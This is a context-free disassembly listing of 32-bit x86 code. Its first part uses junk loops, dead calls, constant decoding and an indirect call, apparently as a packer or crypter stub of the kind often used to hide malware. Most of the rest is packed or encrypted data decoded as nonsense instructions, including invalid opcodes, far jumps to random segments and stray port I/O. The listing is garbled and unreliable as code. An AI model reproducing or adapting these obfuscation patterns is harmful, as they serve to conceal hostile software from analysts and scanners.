  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292ff
  41b9ab:	mov    esi,DWORD PTR ds:0x429bf7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42a9df
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42a9e3
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42a9e7
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42a9eb
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42a9ef
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9bb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9bf
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9c3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	cs out dx,al
  41bd54:	(bad)  
  41bd55:	mov    ebp,0x8382fd27
  41bd5a:	daa    
  41bd5b:	pusha  
  41bd5c:	add    DWORD PTR [ebx-0x2fc1f005],0xffffffe9
  41bd63:	xchg   ecx,eax
  41bd64:	fisttp WORD PTR [esp+esi*8-0x73]
  41bd68:	mov    ds:0xcc905612,al
  41bd6d:	inc    ebp
  41bd6e:	lods   al,BYTE PTR ds:[esi]
  41bd6f:	dec    ecx
  41bd70:	call   0xfb47:0xc4a42648
  41bd77:	pop    edx
  41bd78:	addr16 mov bl,0x96
  41bd7b:	pop    es
  41bd7c:	mov    ds:0x78aede6c,eax
  41bd81:	sub    eax,0x7b7f39b4
  41bd86:	add    al,0xd1
  41bd88:	and    esi,esi
  41bd8a:	adc    dh,BYTE PTR [ebp-0x5e]
  41bd8d:	pop    edi
  41bd8e:	test   al,0x46
  41bd90:	adc    BYTE PTR [edx+0x158393fb],ch
  41bd96:	add    bl,ch
  41bd98:	xchg   ebp,eax
  41bd99:	stc    
  41bd9a:	mov    ds:0x3cfc7a64,eax
  41bd9f:	add    eax,0xe5bc2174
  41bda5:	jnp    0x41bdac
  41bda7:	ja     0x41bd74
  41bda9:	sub    esi,DWORD PTR [edx+0x13829b17]
  41bdaf:	(bad)  [esi]
  41bdb1:	imul   BYTE PTR [esi+0x61]
  41bdb4:	push   edx
  41bdb5:	(bad)  
  41bdb6:	xchg   esi,eax
  41bdb7:	sti    
  41bdb8:	mov    ebp,?
  41bdba:	jbe    0x41be05
  41bdbc:	cld    
  41bdbd:	test   dl,bh
  41bdbf:	fcomp  QWORD PTR [ecx-0x45]
  41bdc2:	repz (bad) 
  41bdc4:	call   0x2efd4c44
  41bdc9:	test   eax,0x26caaae4
  41bdce:	into   
  41bdcf:	mov    ecx,esi
  41bdd1:	mov    dh,0x4f
  41bdd3:	in     al,0x4
  41bdd5:	mov    bh,0xbe
  41bdd7:	cdq    
  41bdd8:	stc    
  41bdd9:	mov    BYTE PTR [esi],0x74
  41bddc:	inc    edx
  41bddd:	shr    DWORD PTR [ecx+0x71],0x3b
  41bde1:	sahf   
  41bde2:	pop    esp
  41bde3:	push   ss
  41bde4:	and    eax,0xbd8ff51f
  41bde9:	mov    eax,ds:0xf78fc72b
  41bdee:	imul   esp,DWORD PTR [edi-0x29dfb4a5],0xffffffd1
  41bdf5:	shl    BYTE PTR [ecx-0x37],cl
  41bdf8:	inc    ebp
  41bdf9:	stos   BYTE PTR es:[edi],al
  41bdfa:	neg    DWORD PTR [ecx]
  41bdfc:	arpl   WORD PTR [esi-0x7c],si
  41bdff:	(bad)  
  41be00:	popf   
  41be01:	jno    0x41be3e
  41be03:	jecxz  0x41be32
  41be05:	or     bh,BYTE PTR [ecx+0x79eb4cd9]
  41be0b:	xchg   BYTE PTR [edi],dl
  41be0d:	mov    ebx,0x2d47de65
  41be12:	ss push edx
  41be14:	jns    0x41be1d
  41be16:	cmp    BYTE PTR [ebx+esi*4],cl
  41be19:	xchg   esp,eax
  41be1a:	mov    al,0xed
  41be1c:	shl    BYTE PTR [edx+0x19],cl
  41be1f:	push   ecx
  41be20:	and    eax,0x414aece5
  41be25:	adc    eax,0x97d4aa1b
  41be2a:	add    dl,ah
  41be2c:	jae    0x41be21
  41be2e:	dec    esi
  41be2f:	rcr    esp,1
  41be31:	ss stos BYTE PTR es:[edi],al
  41be33:	in     eax,dx
  41be34:	mov    DWORD PTR [edx],ebp
  41be36:	pop    ecx
  41be37:	add    al,0xb3
  41be39:	fwait
  41be3a:	loopne 0x41bddc
  41be3c:	mov    esp,0xb8f5f79c
  41be41:	fdivr  st(3),st
  41be43:	(bad)  
  41be44:	push   esi
  41be45:	lds    ebp,FWORD PTR [ebp*4+0x50ac8066]
  41be4c:	sbb    eax,0xec894c55
  41be51:	jno    0x41be7e
  41be53:	aaa    
  41be54:	loopne 0x41beab
  41be56:	inc    eax
  41be57:	call   0x5938:0xd038d9f9
  41be5e:	dec    esi
  41be5f:	pop    edi
  41be60:	or     al,0xf9
  41be62:	addr16 push eax
  41be64:	adc    al,0x6e
  41be66:	imul   edx,DWORD PTR [edi+0x71],0x161accbf
  41be6d:	jbe    0x41be54
  41be6f:	ins    BYTE PTR es:[edi],dx
  41be70:	bound  esi,QWORD PTR fs:[eax]
  41be73:	shr    DWORD PTR [esi-0x1a3a07e8],0x2c
  41be7a:	(bad)  
  41be7b:	jns    0x41be6b
  41be7d:	repz repnz and dl,BYTE PTR [ecx]
  41be81:	mov    ebx,gs
  41be83:	(bad)  
  41be84:	mov    ebx,0x1a606818
  41be89:	mov    ecx,0xb9c1da0a
  41be8e:	xlat   BYTE PTR ds:[ebx]
  41be8f:	bnd jp 0x41be6e
  41be92:	jae    0x41be4e
  41be94:	xor    eax,0x255888ad
  41be99:	xchg   ebp,eax
  41be9a:	pop    ebx
  41be9b:	ins    BYTE PTR es:[edi],dx
  41be9c:	add    eax,0x6a9e9b81
  41bea1:	mov    eax,0x575b9908
  41bea6:	pop    edi
  41bea7:	mov    WORD PTR [esp+ecx*1],fs
  41beaa:	cld    
  41beab:	xchg   esi,eax
  41beac:	mov    edx,0x60b7e573
  41beb1:	cmc    
  41beb2:	mov    ds:0x369d127b,eax
  41beb7:	inc    esp
  41beb8:	int3   
  41beb9:	stos   BYTE PTR es:[edi],al
  41beba:	mul    BYTE PTR [edx-0x15]
  41bebd:	mov    ch,0x5e
  41bebf:	xor    edx,DWORD PTR [esi-0x3a9ef0a6]
  41bec5:	mov    edi,0xec0bed02
  41beca:	mov    DWORD PTR [edi],esi
  41becc:	add    eax,0x43e66ac1
  41bed1:	inc    edi
  41bed2:	std    
  41bed3:	mov    ebx,0xb2654ee8
  41bed8:	(bad)  
  41bed9:	out    0xd8,eax
  41bedb:	xchg   edi,eax
  41bedc:	(bad)  
  41bedd:	pop    eax
  41bede:	ss cmp al,0x67
  41bee1:	aas    
  41bee2:	test   BYTE PTR [ebx+ecx*1-0x77c119ec],0xc0
  41beea:	pusha  
  41beeb:	imul   ebx,DWORD PTR [edx],0x71962a95
  41bef1:	pusha  
  41bef2:	cmp    eax,0xcc588bb9
  41bef7:	test   al,0x7e
  41bef9:	jne    0x41bf08
  41befb:	mov    eax,0x9eb0bc25
  41bf00:	data16 rcr BYTE PTR [eax-0x3c859485],1
  41bf07:	sub    BYTE PTR [ecx],ah
  41bf09:	mov    al,0x2
  41bf0b:	icebp  
  41bf0c:	(bad)  
  41bf0d:	icebp  
  41bf0e:	xchg   DWORD PTR [ebp+0x53],esi
  41bf11:	sbb    esp,DWORD PTR [edi+eax*8-0x13]
  41bf15:	inc    ebp
  41bf16:	xchg   edi,eax
  41bf17:	mov    dh,0x9b
  41bf19:	push   ss
  41bf1a:	mov    cl,0x26
  41bf1c:	or     dl,BYTE PTR [esi]
  41bf1e:	xchg   esp,eax
  41bf1f:	jg     0x41bf0a
  41bf21:	push   0x2e
  41bf23:	in     al,0xbf
  41bf25:	mov    ss,ecx
  41bf27:	jmp    0x41bf35
  41bf29:	jecxz  0x41bf14
  41bf2b:	aam    0xdf
  41bf2d:	int    0x12
  41bf2f:	scas   eax,DWORD PTR es:[edi]
  41bf30:	add    eax,0x13f56b42
  41bf35:	clc    
  41bf36:	test   cl,0x5d
  41bf39:	test   DWORD PTR [esi],eax
  41bf3b:	rcl    DWORD PTR [edx+0x55565e01],cl
  41bf41:	popf   
  41bf42:	jns    0x41bf42
  41bf44:	xchg   esp,eax
  41bf45:	test   BYTE PTR [edx-0x6a],dh
  41bf48:	ficomp WORD PTR [edi+0x62]
  41bf4b:	test   ebx,esi
  41bf4d:	bswap  esi
  41bf4f:	aam    0xba
  41bf51:	test   ebp,edx
  41bf53:	xor    DWORD PTR [ecx],esi
  41bf55:	(bad)  
  41bf56:	cmp    ch,BYTE PTR [eax]
  41bf58:	adc    WORD PTR [ebx],si
  41bf5b:	mov    cs,WORD PTR ds:0x7b2e4e79
  41bf61:	xchg   BYTE PTR [edi+0x41],dl
  41bf64:	xchg   esi,eax
  41bf65:	js     0x41bf38
  41bf67:	sub    BYTE PTR [edx],cl
  41bf69:	sub    DWORD PTR [edi+0x33c10310],ebx
  41bf6f:	pop    ebx
  41bf70:	fwait
  41bf71:	mov    BYTE PTR [esi],dl
  41bf73:	inc    eax
  41bf74:	je     0x41bf36
  41bf76:	test   BYTE PTR [esi],dl
  41bf78:	xchg   BYTE PTR [ecx],cl
  41bf7a:	shl    BYTE PTR [edx+0x67383e45],1
  41bf80:	mov    ds:0x5b2c2fde,al
  41bf85:	and    DWORD PTR [eax-0x5e],ebx
  41bf88:	mov    eax,ds:0xcf2daaf9
  41bf8d:	stc    
  41bf8e:	bound  edi,QWORD PTR [edx]
  41bf90:	iret   
  41bf91:	sbb    DWORD PTR [ebp+0x32],eax
  41bf94:	jl     0x41bf74
  41bf96:	mov    eax,0x78304e27
  41bf9b:	mov    bl,0x34
  41bf9d:	loopne 0x41bf37
  41bf9f:	jno    0x41bfb3
  41bfa1:	pop    es
  41bfa2:	push   ebx
  41bfa3:	(bad)  
  41bfa4:	jmp    0x943e4cbb
  41bfa9:	fs pop ebp
  41bfab:	mov    DWORD PTR [ebx-0x182f5961],esp
  41bfb1:	push   ebp
  41bfb2:	out    0xba,eax
  41bfb4:	sub    DWORD PTR [edi-0x67],eax
  41bfb7:	sub    BYTE PTR [edx],cl
  41bfb9:	cmc    
  41bfba:	cmp    edx,DWORD PTR [edx-0xc]
  41bfbd:	xor    eax,DWORD PTR [esi]
  41bfbf:	dec    ebp
  41bfc0:	fs retf 0x896
  41bfc4:	retf   
  41bfc5:	(bad)  
  41bfc6:	out    dx,eax
  41bfc7:	icebp  
  41bfc8:	scas   al,BYTE PTR es:[edi]
  41bfc9:	test   eax,0x1e65c0d6
  41bfcf:	in     eax,0x2c
  41bfd1:	xor    BYTE PTR [edx+esi*4-0x70],ah
  41bfd5:	xor    DWORD PTR [eax],esi
  41bfd7:	loope  0x41bfa6
  41bfd9:	cdq    
  41bfda:	jg     0x41c037
  41bfdc:	lods   al,BYTE PTR ds:[esi]
  41bfdd:	out    0x72,al
  41bfdf:	loop   0x41c046
  41bfe1:	(bad)  
  41bfe2:	outs   dx,BYTE PTR ds:[esi]
  41bfe3:	(bad)  
  41bfe4:	leave  
  41bfe5:	xchg   ebx,eax
  41bfe6:	xchg   ebx,eax
  41bfe7:	mov    edx,DWORD PTR [esi-0x46fc4ac6]
  41bfed:	dec    edi
  41bfee:	mov    edx,0x23e674f5
  41bff3:	sub    eax,0x3c9b67d7
  41bff8:	xor    BYTE PTR [edx],0xa6
  41bffb:	sbb    eax,0x807f8bb2
  41c000:	popf   
  41c001:	mov    cl,0xc9
  41c003:	pop    ebx
  41c004:	inc    esi
  41c005:	mov    al,0x9e
  41c007:	inc    eax
  41c008:	shr    DWORD PTR [eax+0x17],cl
  41c00b:	pop    ebp
  41c00c:	retf   0x40b
  41c00f:	adc    eax,0x280ee533
  41c014:	lods   eax,DWORD PTR ds:[esi]
  41c015:	jbe    0x41bfea
  41c017:	mov    al,cs:0xd697edd4
  41c01d:	stos   DWORD PTR es:[edi],eax
  41c01e:	pusha  
  41c01f:	repz cmp ah,BYTE PTR [ebx+0x38]
  41c023:	pushf  
  41c024:	add    al,0xed
  41c026:	mov    al,0x17
  41c028:	scas   eax,DWORD PTR es:[edi]
  41c029:	xchg   edi,eax
  41c02a:	pop    edx
  41c02b:	nop
  41c02c:	dec    ecx
  41c02d:	mov    bh,0x77
  41c02f:	repnz dec esi
  41c031:	ss mov eax,0x3e358f42
  41c037:	add    DWORD PTR [edx],edx
  41c039:	mov    ebp,0x2cb35590
  41c03e:	loope  0x41c09d
  41c040:	ja     0x41c066
  41c042:	xchg   ebp,eax
  41c043:	jl     0x41c033
  41c045:	loopne 0x41c02d
  41c047:	ror    esp,cl
  41c049:	loope  0x41c002
  41c04b:	aaa    
  41c04c:	retf   
  41c04d:	repnz cmp al,0xdd
  41c050:	aad    0x5c
  41c052:	icebp  
  41c053:	icebp  
  41c054:	cdq    
  41c055:	leave  
  41c056:	xlat   BYTE PTR ds:[ebx]
  41c057:	pop    ss
  41c058:	cmc    
  41c059:	nop
  41c05a:	into   
  41c05b:	sub    BYTE PTR [edx+0x2483a2fd],0x81
  41c062:	int3   
  41c063:	rcl    DWORD PTR [eax-0x1a614139],1
  41c069:	mov    cl,0x21
  41c06b:	test   eax,0x21a9f56c
  41c070:	sbb    dh,ch
  41c072:	retf   0x44ae
  41c075:	jno    0x41c0c7
  41c077:	fcmovb st,st(2)
  41c079:	adc    ah,BYTE PTR cs:[edi+0x3e]
  41c07d:	in     al,0x29
  41c07f:	scas   al,BYTE PTR es:[edi]
  41c080:	push   esp
  41c081:	push   eax
  41c082:	dec    esi
  41c083:	test   eax,0x43e616fd
  41c088:	push   ebp
  41c089:	mov    esi,0x50dea5c
  41c08e:	push   0xffffffd8
  41c090:	jmp    0xc0c8:0x2725e91e
  41c097:	mov    al,0x72
  41c099:	aad    0x79
  41c09b:	dec    ecx
  41c09c:	adc    ecx,ebx
  41c09e:	push   ss
  41c09f:	and    DWORD PTR cs:[edx-0x27],eax
  41c0a3:	fbstp  TBYTE PTR [ecx+0x18]
  41c0a6:	cmc    
  41c0a7:	push   0x5b24417f
  41c0ac:	aaa    
  41c0ad:	int3   
  41c0ae:	lods   eax,DWORD PTR ds:[esi]
  41c0af:	scas   al,BYTE PTR es:[edi]
  41c0b0:	xchg   ebp,eax
  41c0b1:	call   0x32f0f899
  41c0b6:	jecxz  0x41c063
  41c0b8:	or     DWORD PTR [esi],edi
  41c0ba:	scas   eax,DWORD PTR es:[edi]
  41c0bb:	pop    ebp
  41c0bc:	clc    
  41c0bd:	fstp   DWORD PTR [esi]
  41c0bf:	shl    BYTE PTR [esi+0x20],1
  41c0c2:	clc    
  41c0c3:	and    esp,ebx
  41c0c5:	xchg   DWORD PTR [ecx-0x3f],esp
  41c0c8:	xchg   esi,eax
  41c0c9:	addr16 inc esi
  41c0cb:	and    eax,0xcb114622
  41c0d0:	xchg   esp,eax
  41c0d1:	lahf   
  41c0d2:	out    0x11,eax
  41c0d4:	aam    0x7b
  41c0d6:	mov    edx,0x2e2933b7
  41c0db:	sub    eax,0xfbe5d4e
  41c0e0:	xchg   edi,eax
  41c0e1:	lds    ebp,FWORD PTR [edx+eax*1-0x18]
  41c0e5:	or     BYTE PTR [esi+0x7bdb57ea],0x72
  41c0ec:	ret    
  41c0ed:	xor    al,0x2
  41c0ef:	inc    ebp
  41c0f0:	cld    
  41c0f1:	fadd   DWORD PTR [eax-0x5f0302d5]
  41c0f7:	mov    edi,DWORD PTR [esi-0x7f]
  41c0fa:	in     al,0xb4
  41c0fc:	add    BYTE PTR [ebx-0x757488dc],cl
  41c102:	jmp    0x6bdc:0x66ae567e
  41c109:	pop    esi
  41c10a:	lods   al,BYTE PTR ds:[esi]
  41c10b:	call   0xd4d33566
  41c110:	sahf   
  41c111:	adc    al,0x81
  41c113:	xchg   esi,ebp
  41c115:	inc    esi
  41c116:	dec    eax
  41c117:	pop    ds
  41c118:	pop    edi
  41c119:	mov    bl,0x70
  41c11b:	jns    0x41c0c6
  41c11d:	sahf   
  41c11e:	add    al,0xa
  41c120:	xchg   BYTE PTR ds:0x1b719396,al
  41c126:	or     ecx,0x6ce66464
  41c12c:	call   0x4333:0xac235cc0
  41c133:	sub    eax,DWORD PTR [ecx-0x7584562]
  41c139:	pop    esi
  41c13a:	dec    esi
  41c13b:	out    dx,eax
  41c13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c13d:	add    DWORD PTR [ebp-0x66532ab7],ebx
  41c143:	jle    0x41c150
  41c145:	jmp    0x27a3:0x92c8f3da
  41c14c:	js     0x41c137
  41c14e:	je     0x41c199
  41c150:	cs fadd st,st(0)
  41c153:	xchg   ecx,eax
  41c154:	pop    ebx
  41c155:	mov    ah,0x96
  41c157:	loope  0x41c156
  41c159:	pop    ds
  41c15a:	jl     0x41c0e9
  41c15c:	xchg   edi,eax
  41c15d:	push   ecx
  41c15e:	in     eax,0xed
  41c160:	in     al,dx
  41c161:	add    BYTE PTR [esi+0x369c402b],ch
  41c167:	sbb    al,0x3f
  41c169:	repnz adc BYTE PTR [ecx],0xe3
  41c16d:	push   cs
  41c16e:	bound  ebx,QWORD PTR [ecx+0x7b16146b]
  41c174:	cdq    
  41c175:	push   es
  41c176:	pop    ds
  41c177:	into   
  41c178:	mov    WORD PTR [eax-0x31be6687],gs
  41c17e:	repz retf 0x59b2
  41c182:	add    ch,BYTE PTR [ebx]
  41c184:	loopne 0x41c118
  41c186:	aam    0x38
  41c188:	xor    BYTE PTR [eax+ebx*4],bl
  41c18b:	pop    esp
  41c18c:	fmul   st(3),st
  41c18e:	sbb    ebp,DWORD PTR [esi]
  41c190:	sub    BYTE PTR [edi+0x1b],bh
  41c193:	test   eax,0xf4124c5c
  41c198:	ret    
  41c199:	and    ebx,DWORD PTR [ecx-0x7]
  41c19c:	mov    al,0x78
  41c19e:	inc    ecx
  41c19f:	or     eax,0xaa76c145
  41c1a4:	sbb    dl,BYTE PTR [ecx-0x25]
  41c1a7:	sub    DWORD PTR [ebx+ebx*1],esp
  41c1aa:	scas   eax,DWORD PTR es:[edi]
  41c1ab:	sbb    ebp,ecx
  41c1ad:	std    
  41c1ae:	add    al,BYTE PTR [esi-0x3a]
  41c1b1:	xor    al,0x9e
  41c1b3:	inc    ebx
  41c1b4:	nop
  41c1b5:	xchg   edi,eax
  41c1b6:	retf   0x6d71
  41c1b9:	icebp  
  41c1ba:	and    bh,cl
  41c1bc:	dec    ebp
  41c1bd:	jle    0x41c1f9
  41c1bf:	sbb    dl,bl
  41c1c1:	xlat   BYTE PTR ds:[ebx]
  41c1c2:	xlat   BYTE PTR ds:[ebx]
  41c1c3:	pop    ds
  41c1c4:	stc    
  41c1c5:	adc    eax,0x14d012ad
  41c1ca:	xchg   ecx,eax
  41c1cb:	xchg   DWORD PTR [eax+0x2f],edx
  41c1ce:	sbb    BYTE PTR [edi-0x51],ah
  41c1d1:	sbb    cl,ch
  41c1d3:	sbb    al,0xfc
  41c1d5:	or     dl,BYTE PTR [edi]
  41c1d7:	(bad)  
  41c1d8:	push   ds
  41c1d9:	test   DWORD PTR [esi],eax
  41c1db:	dec    ebx
  41c1dc:	dec    eax
  41c1dd:	mov    esp,0x433ad4b7
  41c1e2:	jne    0x41c1b4
  41c1e4:	stc    
  41c1e5:	test   eax,0xf117d7c
  41c1ea:	adc    DWORD PTR [esi-0x75065a75],0x93b0ae3a
  41c1f4:	pop    esp
  41c1f5:	sbb    dl,BYTE PTR [edx+0x67]
  41c1f8:	xchg   ebp,eax
  41c1f9:	jno    0x41c273
  41c1fb:	cmp    eax,0x2809be43
  41c200:	cmp    esp,DWORD PTR [edx]
  41c202:	mov    ah,0xd3
  41c204:	push   0xf
  41c206:	icebp  
  41c207:	call   0x4e085b1
  41c20c:	sub    al,0x8
  41c20e:	adc    eax,0x85af7617
  41c213:	dec    BYTE PTR [edx+edx*2]
  41c216:	nop
  41c217:	sbb    BYTE PTR [ebx],dl
  41c219:	or     eax,0xac4fa89e
  41c21e:	xor    BYTE PTR [ecx+edi*4+0x431648d],bl
  41c225:	pop    ebx
  41c226:	and    ebp,DWORD PTR ds:0xe8271493
  41c22c:	push   0xade1fe67
  41c231:	and    BYTE PTR [eax-0x6d],al
  41c234:	cld    
  41c235:	mov    WORD PTR [ebx+esi*4-0x57],gs
  41c239:	push   ebx
  41c23a:	sbb    al,0x7d
  41c23c:	jns    0x41c1cc
  41c23e:	js     0x41c25c
  41c240:	mov    dh,0xca
  41c242:	mov    ecx,0x8580cf04
  41c247:	loopne 0x41c28b
  41c249:	bound  eax,QWORD PTR [ebx+0x6b]
  41c24c:	mov    dl,0x8d
  41c24e:	jmp    0x41c24c
